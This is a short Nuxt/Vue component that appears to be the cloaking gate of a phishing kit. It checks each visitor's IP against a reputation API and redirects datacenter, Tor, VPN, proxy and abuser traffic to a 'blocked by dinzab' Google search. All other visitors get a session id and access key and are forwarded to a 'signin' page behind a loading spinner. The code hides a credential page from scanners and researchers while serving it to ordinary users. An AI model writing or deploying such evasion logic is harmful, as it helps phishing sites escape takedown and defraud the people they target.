<script setup lang="ts">
import axios from 'axios'
    const data = await $fetch("https://api.incolumitas.com/")
    if(data.is_bogon == true|| data.is_datacenter == true || data.is_tor == true || data.is_proxy == true || data.is_vpn == true || data.is_abuser == true) {
        navigateTo("https://google.com/search?q=blocked+by+dinzab+(bellahy bara nayek)", {external: true})
    } else {
        await axios.get('/api/checkaccess').then(async res => {
            if(res.data === true) {
                return navigateTo({name: 'signin'})
            } else {
                await useNuxtApp().$api.get('generate').then(async res => {
                    $fetch('/api/save', {
                        method: "POST",
                        body: {
                            id: res.data.id
                        }
                    }).then(async res => {
                        await useNuxtApp().$api.get('lang').then(async res => {
                            await axios.post('/api/setaccess', {
                                lang: res.data.lang,
                                key: "dinzab"
                            }).then(async () => {
                                navigateTo({name: 'signin'})
                            })
                        })
                    })
                })
            }
        })
    }
</script>
<template>
    <div class="spinnerWithLockIcon">
        <p>Loading please wait</p>
        <div class="keychain"></div>
    </div>
</template>